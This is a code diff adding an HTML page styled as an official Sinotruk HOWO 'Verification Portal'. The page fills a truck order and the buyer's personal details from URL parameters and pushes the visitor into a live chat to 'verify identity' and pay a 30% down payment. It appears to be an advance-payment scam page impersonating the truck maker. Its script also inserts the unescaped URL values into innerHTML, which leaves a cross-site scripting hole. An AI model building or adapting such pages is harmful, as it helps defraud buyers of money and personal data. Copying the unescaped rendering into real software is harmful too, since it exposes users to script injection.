@@ -1,0 +1,171 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+    <title>Sinotruk HOWO | Verification Portal</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+    <!-- Crisp Chat Widget -->
+    <script type="text/javascript">
+        window.$crisp=[];
+        window.CRISP_WEBSITE_ID="376d5206-b602-47e1-8e94-e8791be20f4f";
+        (function(){d=document;s=d.createElement("script");s.src="https://client.crisp.chat/l.js";s.async=1;d.getElementsByTagName("head")[0].appendChild(s);})();
+    </script>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #f0f2f5; color: #1A1A1A; line-height: 1.6; min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 20px; }
+        @import url('https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;14..32,400;14..32,500;14..32,600;14..32,700;14..32,800&display=swap');
+        .portal { max-width: 550px; width: 100%; background: #ffffff; border-radius: 16px; box-shadow: 0 8px 30px rgba(0,0,0,0.12); overflow: hidden; }
+        .portal-header { background: #1A1A1A; padding: 20px; text-align: center; border-bottom: 4px solid #C41E3A; }
+        .portal-header h1 { color: #ffffff; font-size: 20px; font-weight: 700; letter-spacing: 1px; }
+        .portal-header .sub { color: #D4AF37; font-size: 13px; margin-top: 2px; }
+        .portal-body { padding: 24px 20px; }
+        .verification-badge { background: #FFF5F5; border: 1px solid #C41E3A; border-radius: 30px; padding: 8px 16px; text-align: center; margin-bottom: 20px; display: inline-block; width: 100%; font-weight: 600; font-size: 14px; color: #C41E3A; }
+        .verification-badge i { margin-right: 6px; }
+        .order-summary { background: #F8F8F8; border-radius: 12px; padding: 18px; margin: 16px 0; border: 1px solid #E5E5E5; }
+        .order-summary h3 { font-size: 14px; font-weight: 700; color: #1A1A1A; margin-bottom: 12px; border-bottom: 1px solid #E5E5E5; padding-bottom: 8px; }
+        .order-row { display: flex; justify-content: space-between; padding: 4px 0; font-size: 14px; }
+        .order-row .label { color: #6B7280; }
+        .order-row .value { font-weight: 600; color: #1A1A1A; }
+        .order-row .value.highlight { color: #C41E3A; }
+        .personal-info { background: #F8F8F8; border-radius: 12px; padding: 18px; margin: 16px 0; border: 1px solid #E5E5E5; }
+        .personal-info h3 { font-size: 14px; font-weight: 700; color: #1A1A1A; margin-bottom: 12px; border-bottom: 1px solid #E5E5E5; padding-bottom: 8px; }
+        .chat-btn { background: #C41E3A; color: white; padding: 14px; border: none; border-radius: 30px; font-weight: 700; font-size: 16px; cursor: pointer; width: 100%; transition: all 0.2s; margin-top: 8px; display: flex; align-items: center; justify-content: center; gap: 10px; }
+        .chat-btn:hover { background: #8B0000; transform: scale(1.02); }
+        .chat-btn i { font-size: 18px; }
+        .portal-footer { text-align: center; padding: 16px 20px; font-size: 11px; color: #888; border-top: 1px solid #E5E5E5; background: #F8F8F8; }
+        .error-message { background: #FEE2E2; color: #C41E3A; padding: 12px; border-radius: 8px; text-align: center; margin: 10px 0; }
+        .info-note { font-size: 12px; color: #6B7280; text-align: center; margin-top: 10px; }
+        @media (max-width: 480px) { .portal { border-radius: 12px; } .portal-body { padding: 16px; } }
+    </style>
+</head>
+<body>
+
+<div class="portal">
+    <div class="portal-header">
+        <h1>SINOTRUK HOWO</h1>
+        <div class="sub">Verification Portal</div>
+    </div>
+    <div class="portal-body">
+        <div id="content">
+            <!-- Content will be rendered by JavaScript -->
+        </div>
+    </div>
+    <div class="portal-footer">
+        <p>Sinotruk HOWO Official Verification Portal &bull; Keep this information secure</p>
+    </div>
+</div>
+
+<script>
+    // Get URL parameters
+    function getParameter(name) {
+        const urlParams = new URLSearchParams(window.location.search);
+        return urlParams.get(name) || '';
+    }
+
+    // Read all parameters
+    const params = {
+        name: getParameter('name'),
+        email: getParameter('email'),
+        phone: getParameter('phone'),
+        address: getParameter('address'),
+        truck: getParameter('truck'),
+        quantity: getParameter('quantity'),
+        upfront: getParameter('upfront'),
+        country: getParameter('country')
+    };
+
+    // Check if we have data
+    const hasData = params.name || params.email || params.truck;
+
+    const content = document.getElementById('content');
+
+    if (!hasData) {
+        content.innerHTML = `
+            <div class="error-message">
+                <i class="fas fa-exclamation-circle"></i> No verification data found.
+            </div>
+            <div style="text-align:center; margin-top:12px; font-size:14px; color:#6B7280;">
+                Please check your email link or contact support.
+            </div>
+            <button class="chat-btn" onclick="openChat()">
+                <i class="fas fa-comment-dots"></i> Contact Support
+            </button>
+        `;
+    } else {
+        content.innerHTML = `
+            <div class="verification-badge">
+                <i class="fas fa-shield-alt"></i> Verification Required
+            </div>
+
+            <p style="font-size:14px; color:#4B4B4B; margin-bottom:8px;">
+                To complete your truck purchase, please verify your identity with our support team.
+            </p>
+
+            <div class="order-summary">
+                <h3><i class="fas fa-truck" style="color:#C41E3A; margin-right:6px;"></i> Order Summary</h3>
+                <div class="order-row">
+                    <span class="label">Truck Model</span>
+                    <span class="value">${params.truck || 'N/A'}</span>
+                </div>
+                <div class="order-row">
+                    <span class="label">Quantity</span>
+                    <span class="value">${params.quantity || '1'}</span>
+                </div>
+                <div class="order-row">
+                    <span class="label">30% Down Payment</span>
+                    <span class="value highlight">${params.upfront || 'N/A'}</span>
+                </div>
+            </div>
+
+            <div class="personal-info">
+                <h3><i class="fas fa-user" style="color:#C41E3A; margin-right:6px;"></i> Applicant Details</h3>
+                <div class="order-row">
+                    <span class="label">Full Name</span>
+                    <span class="value">${params.name || 'N/A'}</span>
+                </div>
+                <div class="order-row">
+                    <span class="label">Email</span>
+                    <span class="value">${params.email || 'N/A'}</span>
+                </div>
+                <div class="order-row">
+                    <span class="label">Phone</span>
+                    <span class="value">${params.phone || 'N/A'}</span>
+                </div>
+                <div class="order-row">
+                    <span class="label">Address</span>
+                    <span class="value">${params.address || 'N/A'}</span>
+                </div>
+            </div>
+
+            <p style="font-size:13px; color:#6B7280; margin:8px 0 12px; text-align:center;">
+                Our support team will verify your identity and assist you with the 30% down payment.
+            </p>
+
+            <button class="chat-btn" id="chatBtn">
+                <i class="fas fa-comment-dots"></i> Complete Verification with Support
+            </button>
+
+            <div class="info-note">
+                <i class="fas fa-lock" style="margin-right:4px;"></i> Secure verification portal
+            </div>
+        `;
+
+        document.getElementById('chatBtn').addEventListener('click', openChat);
+    }
+
+    function openChat() {
+        if (window.$crisp) {
+            window.$crisp.push(['do', 'chat:open']);
+        } else {
+            // Fallback: reload to trigger Crisp
+            window.location.reload();
+        }
+    }
+
+    // Also trigger chat on error page button
+    document.querySelector('.chat-btn')?.addEventListener('click', openChat);
+</script>
+
+</body>
+</html>
